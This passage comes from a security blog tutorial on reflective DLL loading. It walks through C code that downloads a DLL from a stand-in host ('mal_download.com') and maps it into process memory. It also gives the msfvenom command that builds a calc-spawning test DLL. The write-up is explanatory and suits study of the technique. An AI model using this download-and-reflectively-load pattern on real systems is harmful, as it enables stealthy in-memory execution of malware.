https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=813&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367415&amp;s=c6de6d21ebe5df46a3edafc70eb080f6 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367415&amp;s=98fbd650236af0195390d295af47d172, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=813&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367415&amp;s=cd32a3196be48e9f1c84cbb38c814fe7 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367415&amp;s=d83ccb013863f3645cc6a84286a65631, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367415&amp;s=9c174c7a5b9df2677047b1c4723388fe 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367415&amp;s=0d3ddff59e09e00b91f8dc4924046b4e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367415&amp;s=4a358575bb4b0eedad5495d65ded38a0 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367415&amp;s=0d3ddff59e09e00b91f8dc4924046b4e" loading="lazy" x-data="image({mq1024:{width:542,height:910},mq768:{width:542,height:910},mq320:{width:542,height:910},DEFAULT:{width:320,height:537}})" :width="getSize()" :height="getSize('height')" alt="" width="542" height="910" style="opacity: 1;"></picture></div><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367416&amp;s=abd33af00be448554a13e90ba2a10241, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=840&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367416&amp;s=7f332c23b45fd0e78d08fa7df556b30d 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367416&amp;s=5f7614cb98723e5a26f38e0dba7f344b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=840&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367416&amp;s=315fa5eb4eaf3aa5789fa51b80031ac1 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367416&amp;s=4522ebc562ab7c18d97aa6d2474f3434, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=840&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367416&amp;s=7f332c23b45fd0e78d08fa7df556b30d 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367416&amp;s=09ae1375dade857ba2068b29a693ef40, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=840&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367416&amp;s=315fa5eb4eaf3aa5789fa51b80031ac1 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367416&amp;s=daeeb8ac3354b134e80bf1f54fb73cb7, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=840&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367416&amp;s=7f332c23b45fd0e78d08fa7df556b30d 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367416&amp;s=825312d7b057115c6b49e372b376037d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=840&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367416&amp;s=315fa5eb4eaf3aa5789fa51b80031ac1 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367416&amp;s=1956bd19648b971f46bdefc1f881c984, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=479&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367416&amp;s=b9efacf66d4cc30945ba5f4b2098dd3c 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367416&amp;s=ab82373febd5658b2010527be8e276e8, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=479&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367416&amp;s=626bd23593e8eb39455e6ce70949f3b0 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6bNusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367416&amp;s=ab82373febd5658b2010527be8e276e8" loading="lazy" x-data="image({mq1024:{width:560,height:188},mq768:{width:560,height:188},mq320:{width:560,height:188},DEFAULT:{width:319,height:107}})" :width="getSize()" :height="getSize('height')" alt="" width="560" height="188" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 6 - C# Process Modules</figcaption></figure></div><h2>1.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Code Demonstration in C and C#</h2><p class="MsoNormal">The first code sample we will be reviewing is written in C, which will download a file from the Internet. Next, it will reflectively load the new DLL into the current process and execute the malicious code by calling the DLLs DLLMain function. The DLL used in these examples was created using <code>msfvenom -f dll -p windows/exec CMD=”c:\\windows\\system32\\calc.exe” -o spawn_calc.dll.</code></p><p class="MsoNormal">&nbsp;While reviewing both the C and the C# code, I will be skipping over the functions used to download the remote DLL as that is not part of this blog.</p><p class="MsoListParagraph">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Lines 259-269: Programs main function. 10 seconds of sleep allowing time to attach a debugger then it downloads the DLL from the provided URI and passes it to the reflective_loader function to load into the current process’s memory.</p><pre><code data-highlighted="yes" class="hljs language-css"><span class="hljs-number">0259</span>: int <span class="hljs-built_in">main</span>()
<span class="hljs-number">0260</span>: {
<span class="hljs-number">0261</span>:     //sleep for <span class="hljs-number">10</span> seconds
<span class="hljs-number">0262</span>:     <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">10000</span>);
<span class="hljs-number">0263</span>: 
<span class="hljs-number">0264</span>:     char* dllBytes = NULL;
<span class="hljs-number">0265</span>: 
<span class="hljs-number">0266</span>:     dllBytes = <span class="hljs-built_in">DownloadToBuffer</span>(<span class="hljs-string">"http://mal_download.com/spawn_calc.dll"</span>);
<span class="hljs-number">0267</span>:     <span class="hljs-built_in">reflective_loader</span>( dllBytes );
<span class="hljs-number">0268</span>: 
<span class="hljs-number">0269</span>:     <span class="hljs-built_in">free</span>(dllBytes);</code></pre><p class="MsoListParagraphCxSpFirst">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 20: Function header for reflective_loader. Takes as an argument a pointer to a memory location containing the DLL</p><p class="MsoListParagraphCxSpLast">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 23-24: Sets the structure of <a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h#L2300">IMAGE_DOS_HEADER</a> to the beginning of the argument buffer. Allowing for quick access to the MZ header. Using the IMAGE_DOS_HEADER we get the offset to the PE header and set a pointer to that part of the argument buffer using the <a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h#L2617">IMAGE_NT_HEADER structure</a>. In Figure 7 the IMAGE_DOS_HEADER is highlighted in RED and the IMAGE_NT_HEADER is highlighted in BLUE. The value located at 0x1800003C, highlighted in Orange, is the offset (0xD0) to the IMAGE_NT_HEADER. 0x18000000 + 0xD0 =&gt; 0x180000D0</p><pre><code data-highlighted="yes" class="hljs language-java">&nbsp;<span class="hljs-number">0020</span>: <span class="hljs-type">int</span> <span class="hljs-title function_">reflective_loader</span><span class="hljs-params">( <span class="hljs-type">char</span>* dllBytes )</span>
<span class="hljs-number">0021</span>: {
<span class="hljs-number">0022</span>:     <span class="hljs-comment">// get pointers to in-memory DLL headers</span>
<span class="hljs-number">0023</span>:     <span class="hljs-type">PIMAGE_DOS_HEADER</span> <span class="hljs-variable">dosHeaders</span> <span class="hljs-operator">=</span> (PIMAGE_DOS_HEADER)dllBytes;
<span class="hljs-number">0024</span>:     <span class="hljs-type">PIMAGE_NT_HEADERS</span> <span class="hljs-variable">ntHeaders</span> <span class="hljs-operator">=</span> (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes +
<span class="hljs-number">0025</span>:                                   dosHeaders-&gt;e_lfanew);</code></pre><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367418&amp;s=339870a374cd328ddcfb9e8d45ab1267, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367418&amp;s=05ee8996d79470a748d6d0b18e2fcea3 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367418&amp;s=1da3512710616f0d026411b6b7f3f254, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367418&amp;s=eccd81361c85f75c6efe484d54a2a872 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367418&amp;s=8800ad035576d90d47dd5e6a1cf1b424, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367418&amp;s=05ee8996d79470a748d6d0b18e2fcea3 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367418&amp;s=a000ef56bcc26f52d7fe6eb87e12f8d2, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367418&amp;s=eccd81361c85f75c6efe484d54a2a872 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367418&amp;s=bafdb0ec2f68da93e4280e985810e71e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367418&amp;s=8d655dc05676ec5b2f09b0ae659c61b7 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367418&amp;s=60d3a71f201eb9e6b343f8c3727c0803, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367418&amp;s=b681f56d913dc8d1ae5ca8c03d1b7905 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367418&amp;s=f94031f7b82f39de751de1c0ab9c4702, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367418&amp;s=5877033dfff7e5bd6a2243790175e9cc 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367418&amp;s=b7218594fac28e6b44143a266546a213, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367418&amp;s=37dab19014ca5200631e4a8643245c1c 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig7_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367418&amp;s=b7218594fac28e6b44143a266546a213" loading="lazy" x-data="image({mq1024:{width:936,height:574},mq768:{width:936,height:574},mq320:{width:720,height:442},DEFAULT:{width:320,height:196}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="574" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 7 - DLLs MZ and PE headers</figcaption></figure></div><p class="MsoListParagraph">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 27-33: Verify that DLL is not a 32-bit version. The 32-bit version contains different structure sizes, and this reflective loader was only designed for 64-bit DLLs. Contained in the structure, <a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h#L2567">IMAGE_FILE_HEADER</a>, shown in Orange in Figure 8, IMAGE_FILE_MACHINE_I386 is equal to 0x14c. As shown in RED in Figure 8 this value is 0x8664. Endianness causes the “6486” to be flipped to “8664”</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367419&amp;s=476ecd0829ad3d6149bc9f51aeb6f0ea, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367419&amp;s=b6ff7184ba5c44958c7f66a5907bd61e 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367419&amp;s=fe0a8723aa90f8723f177615050598e2, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367419&amp;s=eff5d613aa3ba61540028393f070d117 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367419&amp;s=99bff4a284a69d49e0a1121c707d1324, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367419&amp;s=b6ff7184ba5c44958c7f66a5907bd61e 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367419&amp;s=8d49fc7f6db87cb9d27e495bcfa2aa00, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367419&amp;s=eff5d613aa3ba61540028393f070d117 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367419&amp;s=aee8c4449b7f0a0818b4748e610a2a1e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367419&amp;s=4c732ef11f711c359da5ccc5d1670ed6 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367419&amp;s=928c5ffa4aaecbce72953c8009e84a4a, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367419&amp;s=bc6e55608ea3fb7dd18f550586405baf 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367419&amp;s=054c5fd3041d77ebb654b6ad13ad2e10, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367419&amp;s=3fd74377faec59f1eaae491adf50d5c4 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367419&amp;s=a7c8b476a43805615f4104e84a1a265c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367419&amp;s=cffb7b1146d71df9dd25a6d17256511d 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig8_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367419&amp;s=a7c8b476a43805615f4104e84a1a265c" loading="lazy" x-data="image({mq1024:{width:936,height:52},mq768:{width:936,height:52},mq320:{width:720,height:40},DEFAULT:{width:320,height:18}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="52" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 8 - PE Headers Machine Type</figcaption></figure></div><p class="MsoListParagraphCxSpFirst">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 34: Obtains the size of the DLL as needed when expanded in Memory. The size is located in the OptionalHeader, which is located directly after the File header in the IMAGE_NT_HEADERS structure. Shown in Orange in Figure 8.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 37: Uses the size of the DLL obtained in line 34 to create a new memory region to hold the DLL with the requested location obtained from the Optional Header and the Privileges of Read, Write, and Execute. VirtualAlloc’s first parameter allows for a requested memory location. If this location is in use, it will return an alternate memory address.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 41: Because VirtualAlloc could potentially return a memory address other than the DLLs preferred location, the difference between the preferred location and the actual location needs to be calculated. This difference is used later when resolving relocations.</p><p class="MsoListParagraphCxSpLast">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 45: Copies the data from the Downloaded buffer to our newly allocated memory location.</p><pre><code data-highlighted="yes" class="hljs language-rust"><span class="hljs-number">0034</span>:     SIZE_T dllImageSize = ntHeaders<span class="hljs-punctuation">-&gt;</span>OptionalHeader.SizeOfImage;
<span class="hljs-number">0035</span>: 
<span class="hljs-number">0036</span>:     <span class="hljs-comment">// allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere</span>
<span class="hljs-number">0037</span>:     LPVOID dllBase = <span class="hljs-title function_ invoke__">VirtualAlloc</span>((LPVOID)ntHeaders<span class="hljs-punctuation">-&gt;</span>OptionalHeader.ImageBase,
<span class="hljs-number">0038</span>:                                   dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
<span class="hljs-number">0039</span>: 
<span class="hljs-number">0040</span>:     <span class="hljs-comment">// get delta between this module's image base and the DLL that was read into memory</span>
<span class="hljs-number">0041</span>:     DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)
<span class="hljs-number">0042</span>:                                ntHeaders<span class="hljs-punctuation">-&gt;</span>OptionalHeader.ImageBase;
<span class="hljs-number">0043</span>: 
<span class="hljs-number">0044</span>:     <span class="hljs-comment">// copy over DLL image headers to the newly allocated space for the DLL</span>
<span class="hljs-number">0045</span>:     <span class="hljs-title function_ invoke__">memcpy</span>(dllBase, dllBytes, ntHeaders<span class="hljs-punctuation">-&gt;</span>OptionalHeader.SizeOfHeaders);
<span class="hljs-number">0046</span>: </code></pre><p class="MsoListParagraphCxSpFirst">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 48: Gets the first <a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h#L2684">IMAGE_SECTION_HEADER</a> from the array that follows directly after the OptionalHeader. <a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h#L2702">IMAGE_FIRST_SECTION</a> is a precompiler option that adds the Size of the OptionalHeader to the pointer of the OptionalHeader. The size of the header is in the FileHeader, shown in Red in Figure 9. i.e. 0x1800000E0 + 0xF0 = 0x1800001D0</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 49 - 57: Loops through the array of Section Headers and copies each section into the memory offset as calculated by adding the section’s VirtualAddress to the allocated memory base location.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 51: The first section’s VirtualAddress is shown in Pink in Figure 9. i.e. 0x180000000 + 0x1000.</p><p class="MsoListParagraphCxSpLast">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 53: The source is calculated by adding the allocated memory base address to the Sections.PointerToRawData, shown in Light Blue in Figure 9. i.e. 0x180000000 + 0x400</p><pre><code data-highlighted="yes" class="hljs language-css">
<span class="hljs-number">0047</span>:     // copy over DLL image sections to the newly allocated space for the DLL
<span class="hljs-number">0048</span>:     PIMAGE_SECTION_HEADER section = <span class="hljs-built_in">IMAGE_FIRST_SECTION</span>(ntHeaders);
<span class="hljs-number">0049</span>:     for (size_t i = <span class="hljs-number">0</span>; <span class="hljs-selector-tag">i</span> &lt; ntHeaders-&gt;FileHeader<span class="hljs-selector-class">.NumberOfSections</span>; <span class="hljs-selector-tag">i</span>++)
<span class="hljs-number">0050</span>:     {
<span class="hljs-number">0051</span>:         LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase +
<span class="hljs-number">0052</span>:                                              (DWORD_PTR)section-&gt;VirtualAddress);
<span class="hljs-number">0053</span>:         LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)
<span class="hljs-number">0054</span>:                                        section-&gt;PointerToRawData);
<span class="hljs-number">0055</span>:         <span class="hljs-built_in">memcpy</span>(sectionDestination, sectionBytes, section-&gt;SizeOfRawData);
<span class="hljs-number">0056</span>:         section++;
<span class="hljs-number">0057</span>:     }
<span class="hljs-number">0058</span>: </code></pre><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367420&amp;s=4b7049823debb27517ce9db437daf1ba, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367420&amp;s=0bdce80c710b9f5a3995c7f30d86c832 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367420&amp;s=0bec2fcb3385076e29c0077b04abe253, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367420&amp;s=b9cd29b14c6e2a69413b8b893d86ee84 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367420&amp;s=06aead9627b92553d85e111847e34cb6, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367420&amp;s=0bdce80c710b9f5a3995c7f30d86c832 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367420&amp;s=a5c0f0e38e303dffbc8d252d43f02a4a, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367420&amp;s=b9cd29b14c6e2a69413b8b893d86ee84 1.5x"><source type="image/webp" media="(min-width: 20rem)" 